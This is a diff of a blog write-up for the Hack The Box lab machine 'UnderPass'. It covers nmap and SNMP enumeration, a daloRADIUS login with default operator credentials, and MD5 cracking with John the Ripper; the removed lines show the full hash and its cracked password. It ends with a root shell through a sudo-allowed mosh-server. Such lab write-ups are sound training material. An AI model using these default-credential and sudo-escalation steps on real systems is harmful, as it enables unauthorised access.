@@ -1,18 +1,18 @@
-# UnderPass
+# UnderPass | HTB Writeup
+### SNMP disclosure, Default authentication vulnerability and Mosh
 
-Trying to get back into the saddle with capture the flag style games.
+- `10.10.11.48`
+- Linux
+- Easy
 
-10.10.11.48
-Linux
-Easy
+It's been a minute for me, lets take a crack at it! 
 
-It's been a minute, lets take a crack at it.
+Start with [NMap](/blog/ctfs/tools/nmap) of course.
 
-Start with [NMap](/blog/ctfs/notes/nmap) of course.
+    nmap -sC -sV -vv 10.10.11.48
 
-`> nmap -sC -sV -vv 10.10.11.48`
+Looks like we get responses from the `SSH` port `22` and `HTTP` on port `80`.
 
-    #!sh
     PORT   STATE SERVICE REASON  VERSION
     22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey:
@@ -28,57 +28,52 @@ Start with [NMap](/blog/ctfs/notes/nmap) of course.
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
-Default Apache HTTP page exists on `http://10.10.11.48`
+Visiting the index page for the web server at `http://10.10.11.48/` yields the default apache page
 
-Directory busting - `/server_status` has a 403 but I think that might be a default thing.
+We can try to brute force web directories with and virtual hosts with `gobuster`.
 
-Don't seem to be getting anywhere with this.
+However, it doesn't seem like there's any common routes on this web server... 
 
-Virtual host busting now - nothing there either. using the IP address though so it's not clear.
+The machine doesn't seem to host any `DNS` server. let's do a full port scan.
 
-Lets just try adding `underpass.htb` to the hosts file because usually that's what the host is named.
+    nmap -sS -p- -vv underpass.htb
 
-Still getting back the same default Apache page, lets try the virtual hosts again.
+Same thing.
 
-Nope.
-
-The server doesn't seem to host any `DNS` let's do a full port scan.
-
-`> nmap -sS -p- -vv underpass.htb`
-
-    #!sh
     PORT   STATE SERVICE REASON
     22/tcp open  ssh     syn-ack ttl 63
     80/tcp open  http    syn-ack ttl 63
 
-Same thing.
 
 Hmm... what about `UDP`?
 
-`> nmap -sU -vv underpass.htb`
+    nmap -sU -vv underpass.htb
 
-    #!sh
+Oh! looks like we have `SNMP` related things?
+
     PORT     STATE         SERVICE REASON
     161/udp  open          snmp    udp-response ttl 63
     1812/udp open|filtered radius  no-response
     1813/udp open|filtered radacct no-response
 
-
-Oh! looks like we have `SNMP` related things? Is that a Hack the Box thing? lets test another IP and see.
-
-Nope
-
 Okay, down the [SNMP](/blog/ctfs/notes/snmp) rabbit hole.
 
-found a useful command `snmpwalk` 
+found a useful command called [snmpwalk](/blog/ctfs/tools/snmpwalk) which dumps public `SNMP` records. 
 
-Apparently version 3 of `SNMP` introduces stronger authentication so its always worthwhile to try the weaker versions of the protocol first.
+Apparently version `3` of `SNMP` introduces stronger authentication so its always worthwhile to try the weaker versions of the protocol first.
 
-Just for future reference. `SNMP` version 2 and below uses something like a password to protect the data called a `community string` 
+Just for future reference. `SNMP` version `2c` and below uses something like a password to protect the data called a `community string` 
 
-For publicly available data, usually that password is something like `public`. You can also find default configurations with `private`. 
+Don't ask me why `2c` is called `2c` instead of `2`. I didn't look into it.
 
-`> snmpwalk -v 2c -c public underpass.htb`
+For publicly available data, usually that password is something like `public`. According to
+some older sources, it looks like `private` is also a common default community string. 
+
+Running this command will dump all the public records using the `2c` version of the protocol
+
+    snmpwalk -v 2c -c public underpass.htb
+
+Looks like we found a username, super useful. This looks like something that could even be found in the wild.
 
     SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
     SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
@@ -87,60 +82,85 @@ For publicly available data, usually that password is something like `public`. Y
     SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
     SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
 
-Looks like we found a username, super useful. This looks like something that could even be found in the wild.
 
 We also found what looks like the name of a service. `daloradius`
 
-Doing a quick search online, that's exactly what it is.
+Doing a quick search online, [that's exactly what it is.](https://github.com/lirantal/daloradius.git) 
 
-Looking around this github, I found a route `/daloradius/app/users/login.php` which will allow me to log into the application. Maybe from here we can gather the version of the webserver and look for any CVEs.
+Found `/daloradius/app/users/login.php` which will allow me to log into the application. 
 
-https://github.com/lirantal/daloradius.git
+Maybe from here we can gather the version of the webserver and look for any CVEs.
 
-Tried all the default credentials in the README
+Tried all the default credentials in the README but no luck...
 
-Okay, so i was messing around some more. The default creds dont work under `daloradius/app/users/login.php` but it does work under `daloradius/app/operators/login.php` probably because admins are operators or something
+_~about 2 hours pass~_
 
-anyway
+Okay, so i was messing around some more and this is why it's important to double check things. 
 
-![daloradius-admin](file:///home/parker/Pictures/Screenshots/htb-daloradius.png)
+`daloradius/app/users/login.php` 
 
-found one user named `svcMosh` 
+is for regular users. 
 
+`daloradius/app/operators/login.php` 
 
-mosh is like ssh so perhaps its connected to the ssh port. if its the mosh im thinking of... 
+is for admins. 
 
-the user's MD5 password is seemingly right here in the UI lmao 
+![daloradius-admin](/static/media/ctf/htb-daloradius.png)
 
-cracking 
+Anyway... It's important to reset the default password after installing one of these dashboards. Otherwise _anyone_ could just read the GitHub documentation and log in. 
 
-the MD5 hash was:  `412DD4759978ACFCC81DEAB01B382403` 
-the password is: `underwaterfriends` 
+I found one user named `svcMosh` in the users list. The word `Mosh` leads me to believe that the program `Mosh` is involved somehow, but we'll have to see.
 
-okay so using those creds with ssh doesnt seem to do anything. not with `steve` or `svcmosh`
+When we go the users page, an `MD5` hash for our user is seemingly right here in the UI.
 
-maybe this will come in handy later?
+`412DD4...` is the first 6 characters of the hash. You can see for yourself what the rest of the chracters are. We're going to save this into `md5sum.txt`
 
-daloradius version `version 2.2 beta / 03 Jul 2024` so maybe no SQLi...
+    john --wordlist=./rockyou.txt --format=Raw-MD5 ./md5sum.txt
+
+[John the Ripper](https://www.openwall.com/john/) will make short work of this hash with the `rockyou.txt` wordlist.
+
+Okay... Using those creds with `SSH` doesnt seem to do anything. not with `steve` or `svcmosh`
+
+maybe this is just something that will come in handy later?
+
+...`version 2.2 beta / 03 Jul 2024` so maybe no SQLi like we see on `exploitdb`...
+
+_~about 2 more hours pass~_
 
 I WAS BEING DUMB. CASE MATTERS
 
-`ssh svcMosh@underpass.htb` with the cracked hash gives us a user on the box. yay~
+`ssh svcMosh@underpass.htb` with the cracked hash gives us a user on the box. 
 
-Okay... after looking through the machine for a few hours, here's what we have.
+![dalradius-user-shell](/static/media/ctf/htb-daloradius-user.png)
+
+Yay!
 
 The first thing to do is check if we straight up have root privs for anything, so `sudo -l` which gives us the interesting path of `/usr/bin/mosh-server`
 
+    Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+    User svcMosh may run the following commands on localhost:
+        (ALL) NOPASSWD: /usr/bin/mosh-server
+
 I will save you the wasted time and effort I made while trying to crack this, but this is kinda sneaky.
 
-the program `mosh` works by running `mosh-client` to interact with ssh, and then through ssh to start `mosh-server` on the remote machine.
-
-if we had `sudo` privs for `mosh` we could just use the `-- [command]` option for escalation, for some reason in the `mosh-server` command that option does not work.
+the program `mosh` works by running `mosh-client` to interact with `SSH`, and then running a command through `SSH` to start `mosh-server` on the remote machine.
 
 the `mosh` command has an argument called `--server` which is _what I thought was_ a strict path, however it's perfectly valid to supply arguments as well.
 
 Seeing this, there's nothing stopping us from supplying `sudo /usr/bin/mosh-server` for the path.
 
-When running `mosh --server="sudo /usr/bin/mosh-server" localhost` we are dropped into a root shell
+    mosh --server="sudo /usr/bin/mosh-server" localhost
+    
+drops us into a root shell.
 
-nice!
+![dalradius-root-shell](/static/media/ctf/htb-daloradius-root.png)
+
+Nice! 
+
+I would say this machine is very easy. I was able to figure it out without any help except for the `SNMP` foothold, but that was minimal. 
+
+_~ Happy Hacking_
